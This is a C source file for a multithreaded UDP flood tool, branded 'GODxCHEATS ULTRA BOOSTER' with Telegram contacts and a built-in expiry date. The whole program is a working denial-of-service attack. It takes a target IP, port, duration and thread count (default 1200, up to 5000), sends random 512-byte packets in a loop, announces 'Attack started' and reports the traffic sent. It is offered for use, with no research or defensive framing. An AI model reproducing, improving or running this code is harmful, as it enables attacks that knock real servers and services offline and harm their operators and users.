#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2025-12-31"  // Updated expiry date
#define DEFAULT_PACKET_SIZE 512   // Increased packet size
#define DEFAULT_THREAD_COUNT 1200  // Increased default threads
#define MAX_THREADS 5000           // Safety limit

struct thread_data {
    char *ip;
    int port;
    int duration;
    unsigned long *total_packets_sent;
    unsigned long *total_bytes_sent;
    int *running;  // Shared flag to control threads
};

// Improved banner with version info
void print_banner() {
    printf("\033[1;33m╔════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;33m║ \033[1;37m★ \033[1;32mGODxCHEATS ULTRA BOOSTER v2.0 \033[1;37m★ \033[1;33m║\033[0m\n");
    printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;33m║ \033[1;36m✦ DEVELOPED BY: \033[1;35mALONEBOY GODxCHEATS \033[1;33m║\033[0m\n");
    printf("\033[1;33m║ \033[1;31m✦ VALID UNTIL: \033[1;32m%s \033[1;33m║\033[0m\n", EXPIRY_DATE);
    printf("\033[1;33m║ \033[1;34m✦ TELEGRAM: \033[1;32m@ALONExHUNTERFREE \033[1;33m║\033[0m\n");
    printf("\033[1;33m╚════════════════════════════════════════════════════════════════════════════════╝\033[0m\n");
}

// Enhanced expiry check
int check_expiry() {
    time_t now = time(NULL);
    struct tm expiry = {0};
    char *e = strdup(EXPIRY_DATE);
    
    if (sscanf(e, "%d-%d-%d", &expiry.tm_year, &expiry.tm_mon, &expiry.tm_mday) != 3) {
        free(e);
        return 1; // Invalid date format = expired
    }
    free(e);
    
    expiry.tm_year -= 1900;
    expiry.tm_mon -= 1;
    expiry.tm_hour = 23;
    expiry.tm_min = 59;
    expiry.tm_sec = 59;
    
    time_t expiry_time = mktime(&expiry);
    double diff = difftime(expiry_time, now);
    
    if (diff < 0) {
        printf("\n\033[1;31m[!] TOOL EXPIRED ON %s\033[0m\n", EXPIRY_DATE);
        printf("\033[1;33m[!] Contact @GODxAloneBOY for updates\033[0m\n\n");
        return 1;
    }
    
    // Warning if within 7 days of expiry
    if (diff < (7 * 24 * 3600)) {
        printf("\033[1;33m[!] WARNING: Tool expires in %.0f days!\033[0m\n", diff/(24*3600));
    }
    
    return 0;
}

// Optimized attack thread
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *payload = malloc(DEFAULT_PACKET_SIZE);
    
    if (!payload) {
        perror("Memory allocation failed");
        pthread_exit(NULL);
    }
    
    memset(payload, rand() % 256, DEFAULT_PACKET_SIZE); // Randomized payload
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        free(payload);
        pthread_exit(NULL);
    }

    // Enable broadcast
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);

    time_t start = time(NULL);
    time_t end = start + data->duration;
    
    while (time(NULL) < end && *(data->running)) {
        if (sendto(sock, payload, DEFAULT_PACKET_SIZE, 0,
                  (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            continue; // Skip failed sends but keep trying
        }
        __sync_add_and_fetch(data->total_packets_sent, 1);
        __sync_add_and_fetch(data->total_bytes_sent, DEFAULT_PACKET_SIZE);
    }

    close(sock);
    free(payload);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Initial checks
    if (check_expiry()) return 1;
    print_banner();
    
    if (argc < 4) {
        printf("\033[1;37mUsage: %s <IP> <PORT> <DURATION> [THREADS]\n", argv[0]);
        printf("\033[1;33mExample: %s 1.1.1.1 80 60 2000\033[0m\n", argv[0]);
        return 1;
    }

    // Validate input
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc > 4) ? atoi(argv[4]) : DEFAULT_THREAD_COUNT;
    
    if (threads > MAX_THREADS) {
        printf("\033[1;31m[!] Thread limit exceeded (max %d)\033[0m\n", MAX_THREADS);
        threads = MAX_THREADS;
    }

    // Shared variables
    int running = 1;
    unsigned long total_packets = 0;
    unsigned long total_bytes = 0;
    
    printf("\033[1;35m\n[+] Target: %s:%d\n", argv[1], port);
    printf("[+] Duration: %d seconds\n", duration);
    printf("[+] Threads: %d\n", threads);
    printf("[+] Packet size: %d bytes\033[0m\n\n", DEFAULT_PACKET_SIZE);

    // Create threads
    pthread_t *tid = malloc(threads * sizeof(pthread_t));
    struct thread_data *td = malloc(sizeof(struct thread_data));
    
    td->ip = argv[1];
    td->port = port;
    td->duration = duration;
    td->total_packets_sent = &total_packets;
    td->total_bytes_sent = &total_bytes;
    td->running = &running;

    printf("\033[1;32m[+] Attack started...\033[0m\n");
    time_t start_time = time(NULL);
    
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, attack, (void*)td) != 0) {
            perror("Thread creation failed");
            running = 0;
            break;
        }
    }

    // Progress display
    while (time(NULL) - start_time < duration && running) {
        int remaining = duration - (time(NULL) - start_time);
        printf("\r\033[1;36m[+] Running: %02d:%02d | Packets: %lu | Traffic: %.2f MB",
              remaining/60, remaining%60, total_packets, (double)total_bytes/(1024*1024));
        fflush(stdout);
        sleep(1);
    }

    running = 0; // Signal threads to stop
    
    // Cleanup
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }
    
    free(tid);
    
    printf("\033[1;33m╔════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
printf("\033[1;33m║ \033[1;32mALONExHUNTER ON TOP 🍀\033[1;33m ║\033[0m\n");
printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
printf("\033[1;33m║ \033[1;36m✦ STATUS: \033[1;32mCOMPLETED SUCCESSFULLY!\033[1;33m ║\033[0m\n");
printf("\033[1;33m║ \033[1;36m✦ PACKETS SENT: \033[1;37m%-20lu \033[1;33m║\033[0m\n", total_packets);
printf("\033[1;33m║ \033[1;36m✦ TRAFFIC SENT: \033[1;37m%-10.2f MB \033[1;33m║\033[0m\n", (double)total_bytes/(1024*1024));
printf("\033[1;33m║ \033[1;36m✦ AVG SPEED: \033[1;37m%-10.2f Mbps \033[1;33m║\033[0m\n", (total_bytes*8)/(duration*1024*1024.0));
printf("\033[1;33m║ \033[1;36m✦ DURATION: \033[1;37m%-10d seconds \033[1;33m║\033[0m\n", duration);
printf("\033[1;33m║ \033[1;31m✦ FINISHED BY: \033[1;35m@GODxAloneBOY \033[1;33m║\033[0m\n");
printf("\033[1;33m╚════════════════════════════════════════════════════════════════════════════════╝\033[0m\n\n");
    
    return 0;
}
